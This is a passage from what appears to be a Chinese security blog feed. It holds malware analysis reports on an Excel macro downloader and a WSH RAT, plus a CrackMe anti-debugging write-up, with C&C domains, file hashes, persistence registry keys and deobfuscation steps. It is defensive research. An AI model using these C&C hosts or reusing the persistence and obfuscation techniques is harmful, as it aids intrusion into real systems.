src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426153856.png" alt="1569426153856"></p><p>然后F9运行到硬件断点出，然后单步没有几步，就会看到一个<code>pushad</code>，这里再次用ESP定律，给<code>ESP</code>下硬件断点。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426325644.png" alt="1569426325644"></p><p>然后就到了该DLL真正的入口点，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426396535.png" alt="1569426396535"></p><p>然后将其dum下来，这里需要注意要修改插件==Scylla==的属性，去掉选项<code>Use PE header from disk</code>，这个选项用的是原来DLL的PE头，也就是执行原来壳的PE头中的导出表，这里需要将其勾掉。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426822212.png" alt="1569426822212"></p><p>再查dump出来的DLL文件，发现导出表正常了，找到了调用执行的函数<code>Amway</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569426966404.png" alt="1569426966404"></p><h2 id="分析主要行为函数"><a href="#分析主要行为函数" class="headerlink" title="分析主要行为函数"></a>分析主要行为函数</h2><p>该样本是通过加载<code>exchange1.dll</code>，然后执行其函数<code>Amway</code>，实现其相应的攻击。该样本的重点就是分析主要行文函数<code>Amway</code>。</p><p><strong>构造网络请求包头</strong></p><p>构造网络请求包头，后面进行数据传输时会用到，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569454276748.png" alt="1569454276748"></p><p><strong>获取操作系统信息</strong></p><p>获取了本地主机的==标准DNS名称==、获取了当前==用户信息==，以及==操作系统版本号==，并将数据进行了加工和拼接，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569454531764.png" alt="1569454531764"></p><p><strong>枚举进程</strong></p><p>枚举当前的所有进程，并将进程与之前获取的信息进行了拼接，如图：    </p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569454828894.png" alt="1569454828894"></p><p>最终将获取到的信息与枚举的进程，进行拼接的结果，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455033474.png" alt="1569455033474"></p><p><strong>与远程服务器通信</strong></p><p>获取远程服务器的域名，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455225847.png" alt="1569455225847"></p><p>将获取到的主机信息，发送至远程服务器，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455549229.png" alt="1569455549229"></p><p><strong>下载可执行文件</strong></p><p>先判断与远程服务器通信的状态码，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455668682.png" alt="1569455668682"></p><p>当状态码为200，也就是连接正常时，下载==可执行文件==，到临时目录下，并命名为<code>boost1.exe</code>。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455713813.png" alt="1569455713813"></p><p><strong>创建进程执行下载文件</strong></p><p>通过函数<code>CreateProcessW</code>，创建进程，执行下载的==可执行文件==，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455934027.png" alt="1569455934027"></p><p>这里由于远程服务器已经宕掉了，这里也无法获取到从远程服务器上下载的文件，进而无法进一步分析下载后的程序<code>boost1.exe</code>。</p><h1 id="0x03-查杀方案"><a href="#0x03-查杀方案" class="headerlink" title="0x03 查杀方案"></a>0x03 查杀方案</h1><p>由于远程服务器宕掉了，并未下载到最终要执行的可执行文件，无法对下载后的可执行文件的行为进行分析，因此无法对该可执行文件进行查杀。</p><p><strong>删除病毒文件</strong></p><p>但目前分析的这个样本本质就是一个下载器，查杀方案只需将该样本本身以及释放出来的所有文件删除即可，要==删除的文件==，如下表：</p><table><thead><tr><th>病毒本身：</th></tr></thead><tbody><tr><td>3EFFEBA64D9A1A4DD1BDDAEB1858E4D0.xls</td></tr><tr><td><strong>释放出来的文件：</strong></td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\13.xlsx</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\13.xlsx.zip</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\oleObject1.bin</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Roamingexchange1.dll</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\boost1.exe</td></tr></tbody></table><h1 id="0x04-样本溯源"><a href="#0x04-样本溯源" class="headerlink" title="0x04 样本溯源"></a>0x04 样本溯源</h1><table><thead><tr><th>FileName</th><th>FileSize</th><th>MD5</th></tr></thead><tbody><tr><td>3EFFEBA64D9A1A4DD1BDDAEB1858E4D0.xls</td><td>346112 bytes</td><td>3108C6B3B4ACC06E8B26AF7AE0142A45</td></tr><tr><td>13.xlsx</td><td>235896 bytes</td><td>90F4CBB72628ABC27FEDBE872A0FFFE6</td></tr><tr><td>13.xlsx.zip</td><td>235896 bytes</td><td>90F4CBB72628ABC27FEDBE872A0FFFE6</td></tr><tr><td>oleObject1.bin</td><td>164864 bytes</td><td>27C9912C99DBC5052A97E9D9EB4C23FA</td></tr><tr><td>exchange1.dll</td><td>81920 bytes</td><td>3707203BDA6A72601CD4461DF3A14240</td></tr></tbody></table><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>https[:]//office-teml-en.com/tw</td></tr></tbody></table><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><blockquote><p>该样本通过Excel进行传播，并借助宏来执行下载和执行文件等恶意行为。因此在查看带有宏的文件时，应多加小心，确认其来源之后，在进行查看。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 宏病毒 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> Downloader </tag>
            
            <tag> 样本分析报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CrackMe 1</title>
      <link href="2019/10/01/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/"/>
      <url>2019/10/01/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>CrackMe 1</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该Crack Me中有3个反调试，其根据反调试的检测，结果生成不同的KEY。然后利用生成的KEY与密码进行异或，再拿异或后的结果进行比较。只有检测到没有被调试时，该KEY的值才能与密码异或出的结果，才能比较成功。</p></blockquote><h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><p>将Crack Me拖入IDA中，查看其main函数，发现主要判断逻辑，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570522558612.png" alt="1570522558612"></p><h2 id="NtGlobalFlags反调试"><a href="#NtGlobalFlags反调试" class="headerlink" title="NtGlobalFlags反调试"></a><code>NtGlobalFlags</code>反调试</h2><p>通过获取PEB中偏移为==0x68==的<code>NTGlobalFlags</code>标志位，来判断当前程序是否被调试，<code>NTGlobalFlags</code>标志位，默认情况下该值为0，如果在调试中会被设置为一个特定的值（0x70），并根据检测结果设置不同的==KEY==值，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570522583999.png" alt="1570522583999"></p><h2 id="NtQueryInformationProcess反调试"><a href="#NtQueryInformationProcess反调试" class="headerlink" title="NtQueryInformationProcess反调试"></a><code>NtQueryInformationProcess</code>反调试</h2><p>该Crack Me通过函数<code>NtQueryInformationProcess</code>，来检测是否被调试。</p><p>其中通过函数<code>NtQueryInformationProcess</code>，进行了3次查询，分别为：</p><ul><li>检测参数==ProcessDebugPort（0x7）==，函数返回调试端口，当调试端口<code>dwDebugPort</code>不为0时，说明当前程序正在被调试。</li><li>检测参数==ProcessDebugObjecthandle（0x1E）==，函数返回调试对象句柄，当句柄<code>hDebugObject</code>不为0时，说明当前程序正在被调试。</li><li>检测参数==Debug Flag(0x1F)==，函数返回调试标志，当标志<code>bDebugFlag</code>为0，则处于调试状态;若为1，则处于非调试状态。</li></ul><p>根据检测结果来生成不同的==KEY==，最终实现干扰password的比较，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570521508893.png" alt="1570521508893"></p><h2 id="NtQueryObject反调试"><a href="#NtQueryObject反调试" class="headerlink" title="NtQueryObject反调试"></a><code>NtQueryObject</code>反调试</h2><p>该Crack Me通过函数<code>NtQueryObject</code>，来检测当前进程是否被调试。</p><p>当一个调试活动开始时，一个==debug object==便会被创建，可通过函数<code>NtQueryObject</code>查找该Object，从而来判断当前程序是否正在被调试，然后根据检测的结果，生成不同的密钥==KEY==，最终实现干扰password的比较，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570511183616.png" alt="1570511183616"></p><p>根据两种反调试函数的检测结果，来生成后面对比密码时用到的==KEY==，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570511738666.png" alt="1570511738666"></p><h1 id="获取正确密码"><a href="#获取正确密码" class="headerlink" title="获取正确密码"></a>获取正确密码</h1><p>首先，可以通过IDA或OD，知道密码一共有==20位==，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570511792991.png" alt="1570511792991"></p><p>然后结合IDA，通过OD去调试该<code>CrackMe</code>，发现会将输入的密码的每一位与之前生产的==KEY==进行<code>异或运算</code>，然后将运算结果与地址==true_PW_403250==中存储的数据进行比较，当完全一致时，便能验证密码是正确的。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570512289226.png" alt="1570512289226"></p><p>地址==true_PW_403250==中存储的数据，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570512332320.png" alt="1570512332320"></p><p>因为是将密码<code>Password</code>与密钥==KEY==进行<code>异或</code>后得到地址==true_PW_403250==中的值。</p><h2 id="计算正确密码"><a href="#计算正确密码" class="headerlink" title="计算正确密码"></a>计算正确密码</h2><ul><li><p>要想获得正确密码：就需要将地址==true_PW_403250==中的值与密钥==KEY==进行异或，就能得到原本正确的<code>Password</code>。</p></li><li><p>若命中反调试函数，==KEY==的值会被修改。因此这里用<code>strongOD</code>来反反调试，获取到正确的==KEY==值为37。</p></li><li><p>然后经过计算，便能正确密码。</p></li></ul><p>==正确密码为==：<code>N1ha0bangbangya~^_^~</code></p><p>得到的正确结果，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/1570512628384.png" alt="1570512628384"></p>]]></content>
      
      
      <categories>
          
          <category> 日常分析学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CrackMe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSH RAT分析报告</title>
      <link href="2019/09/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH%20RAT/"/>
      <url>2019/09/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH%20RAT/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>WSH RAT分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>4gdrwceq60b7dbl.sct</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>蠕虫、远控木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>394KB (403,845字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>69B7D326575C5616D82645960B3D081A</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>经过分析，该恶意样本是一个js脚本（伪装成.sct文件），当该样本执行起来，会再释放出两个js文件，并添加开机自启动，感染可移动设备（也通过可移动设备进行传播），并与两个C&amp;C服务器进行交互，从C&amp;C服务器上接收指令，执行不同的操作。其远控功能完事，能释放多种模块，执行不同的指令等。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p><center>样本执行流程图</center><h1 id="0x01-样本细节详细分析"><a href="#0x01-样本细节详细分析" class="headerlink" title="0x01 样本细节详细分析"></a>0x01 样本细节详细分析</h1><h2 id="提取JS代码"><a href="#提取JS代码" class="headerlink" title="提取JS代码"></a>提取JS代码</h2><p>该样本是一个<font color=red>Script Component</font>格式的文件，属于文本文件，这里直接用记事本打开该文件，发现文件中存在大 量的JS代码，初步判断这是一个由JavaScript编写的恶意代码，通过伪装成.sct文件进行传播的。将其中JS全部拷贝至一个js文件中，本文将其命名为<font color=red>1.js</font>，继续进行下一步分析。文件内容如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568788099959.png" alt="1568788099959"></p><h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="1-文件写入行为分析"><a href="#1-文件写入行为分析" class="headerlink" title="1.文件写入行为分析"></a>1.文件写入行为分析</h3><p>运行提取出来的JS代码，然后对所有子进程的写入行为进行过滤，发现共写入了4个文件，分别在下表的两个路径中，各释放了taskmgr.js和aFCnKVCdfY.js两个JS文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\User\&lt;UserName&gt;\AppData\Roaming</span><br><span class="line"></span><br><span class="line">C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Monitor抓取到的行为如图1：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568790008293-1568790100792.png" alt="1568790008293"></p><center>图1</center>- 然后逐步查看文件释放过程，用monitor先对提取出来的1.js文件进行过滤，发现1.js只在C:\User\<UserName>\AppData\Roaming路径下释放了taskmgr.js文件。如图1.1：<p>  <img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568794415800.png" alt="1568794415800"></p>  <center>图1.1</center><ul><li><p>然后对进程taskmgr.js的文件写入行为进行过滤，发现在taskmgr.js在C:\User&lt;UserName&gt;\AppData\Roaming路径下释放了aFCnKVCdfY.js，并且将自身复制到开机自启动目录下，如图1.2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568794858199.png" alt="1568794858199"></p><center>图1.2</center></li><li><p>然后对进程aFCnKVCdfY.js的文件写入行为进行过滤，发现aFCnKVCdfY.js将自身复制到开机自启目录下，如图1.3：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568795005351.png" alt="1568795005351"></p><center>图1.3</center></li></ul><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><ul><li>查看进程树，运行提取出来的JS代码程序后，迅速结束自身。然后运行释放在AppData中的<font color=red>taskmgr.js</font>。如图2：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568790452813.png" alt="1568790452813"></p><center>图2</center>- 然后执行的脚本<font color=red>taskmgr.js</font>又执行了释放在AppData中的<font color=red>aFCnKVCdf.js</font>，如图3：<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568790636764.png" alt="1568790636764"></p><center>图3</center>### 3.网络行为分析<p>执行起来的两个脚本文件，进行了大量的网络请求。并且从中不难看出，每个脚本都在不断的与一个固定的域名进行通信，且两个脚本所通信的域名也并不相同。如图4：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568791204672.png" alt="1568791204672"></p><center>图4</center>### 4.注册表行为分析<p>运行起来的两个脚本文件，分别添加了两个自启动项，分别为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\taskmgr.js</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\aFCnKVCdf.js</span><br></pre></td></tr></table></figure><p>Monitor抓取的修改注册表行为，如图5：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568791716413.png" alt="1568791716413"></p><center>图5</center>## 样本详细分析<h3 id="释放文件taskmgr-js"><a href="#释放文件taskmgr-js" class="headerlink" title="释放文件taskmgr.js"></a>释放文件taskmgr.js</h3><p>打开提取出来的1.js文件，发现该文件中存在大量经过特殊处理的数据。然后经过分析，1.js这个脚本文件主要是将这些经过加工的数据还原，然后再将还原后的数据写入<font color=red>C:\Users\john\AppData\Roaming\taskmgr.js</font>文件中。也就释放出了Appdata目录下的taskmgr.js文件了，行为可见行为分析图1.1所示。1.js代码执行代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568798133825.png" alt="1568798133825"></p><h3 id="分析taskmgr-js：解密并执行"><a href="#分析taskmgr-js：解密并执行" class="headerlink" title="分析taskmgr.js：解密并执行"></a>分析taskmgr.js：解密并执行</h3><p>查看taskmgr.js的代码，能发现该代码中又有大量加密过的数据。经过分析，taskmgr.js脚本主要就是将经过替换加密的数据还原，并调用<font color=red>eval()函数</font>，执行解密后的数据。由于该脚本的执行逻辑比较复杂，为了读者能更好的理解，这里将调主要的执行步骤加以说明。</p><ul><li><p>替换过程：首先通过正则表达式选中文中所有的<font color=red>！- %</font>,然后通过函数replace将正则选中的（！- %）全部替换为A,如下图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568857877945.png" alt="1568857877945"></p></li><li><p>解密过程：先初始化一个元素tmp，将tmp.datatype设置为base64，再将tmp.text设置为上一步替换后的数据，然后通过<font color=red>nodeTypeValue</font>属性，将替换后的数据解密出来，然后再转换为字符串赋值到.oneFam1ly[1].item。此时的.oneFam1ly[1].item就是最终要执行的代码。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568859989461.png" alt="1568859989461"></p></li><li><p>执行过程：先通过meatSTEW执行，执行完返回eval（），然后再通过eval执行上一步解密出来的数据。，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568861002712.png" alt="1568861002712"></p></li></ul><h3 id="分析taskmgr-js所执行的解密代码"><a href="#分析taskmgr-js所执行的解密代码" class="headerlink" title="分析taskmgr.js所执行的解密代码"></a>分析taskmgr.js所执行的解密代码</h3><p>这里以同样的方式进行解密，先将加密数据中的!-%替换为A，再通过notepad++进行解密，就能获取到taskmgr所执行的代码，将解密后的代码保存下来并命名为taskmgr_new_1，代码如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568861303465.png" alt="1568861303465"></p><h3 id="释放文件aFCnKVCdfY-js"><a href="#释放文件aFCnKVCdfY-js" class="headerlink" title="释放文件aFCnKVCdfY.js"></a>释放文件aFCnKVCdfY.js</h3><p>执行的task_new_1,首先释放了文件<font color=red>aFCnKVCdfY.js</font>,先获取Appdata的环境变量，再进行拼接路径，然后将加密的数据写入该文件中，行为可见行为分析图1.2，执行代码如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568862105907.png" alt="1568862105907"></p><p>然后下面的部分就先不详细分析了，因为下面的部分与后面将要分析aFCnKVCdfY.js所执行的解密数据的内容基本都是相同的，所以会在后面分析aFCnKVCdfY.js所执行的解密数据中进行详细分析。而taskmgr.js所执行的解密数据中与aFCnKVCdfY.js所执行的解密数据，唯一的不同在于:C&amp;C服务器不同，如图：</p><blockquote><table><thead><tr><th>taskmgr_new_1.js所访问的C&amp;C服务器</th></tr></thead><tbody><tr><td>globalization.duckdns.org：50071</td></tr></tbody></table></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568862325996.png" alt="1568862325996"></p><h3 id="分析aFCnKVcdfY-js：解密并执行"><a href="#分析aFCnKVcdfY-js：解密并执行" class="headerlink" title="分析aFCnKVcdfY.js：解密并执行"></a>分析aFCnKVcdfY.js：解密并执行</h3><p>经过对比发现释放出来的文件<font color=red>aFCnKVcdfY.js</font>,与之前分析的<font color=red>taskmgr.js</font>,除了要执行的代码不同外其他都是一样的。因此也就<strong>如同taskmgr.js一样，是解密数据并执行，只不过执行的代码不同罢了</strong>。这里就不在做过多的分析。两个文件的对比图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568863479242.png" alt="1568863479242"></p><h3 id="分析aFCnKVcdfY-js所执行的解密代码"><a href="#分析aFCnKVcdfY-js所执行的解密代码" class="headerlink" title="分析aFCnKVcdfY.js所执行的解密代码"></a>分析aFCnKVcdfY.js所执行的解密代码</h3><h4 id="初始化信息"><a href="#初始化信息" class="headerlink" title="初始化信息"></a>初始化信息</h4><p>初始化后面要用到的数据，如：C&amp;C服务器，和文件下载路径installdir,以及开机自启动路径等信息。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568865304626.png" alt="1568865304626"></p><h4 id="样本主要行为函数分析"><a href="#样本主要行为函数分析" class="headerlink" title="样本主要行为函数分析"></a>样本主要行为函数分析</h4><p>初始化完数据后，代码进入主要执行部分，接下来将逐个分析该恶意样本能做什么做了什么。它的主要行为函数段如下图：<img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568869097927.png" alt="1568869097927"></p><h4 id="初始化实例，添加自启动，确保文件已运行"><a href="#初始化实例，添加自启动，确保文件已运行" class="headerlink" title="初始化实例，添加自启动，确保文件已运行"></a>初始化实例，添加自启动，确保文件已运行</h4><p>函数<font color=red>instance</font>，修改注册表项,并调用函数<font color=red>upstart</font>添加开机自启动项，并检查释放出来的文件是否已运行，若没运行便启用。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH_RAT/1568871419284.png" alt="1568871419284"></p><ul><li><p>其中添加自启动项函数<font 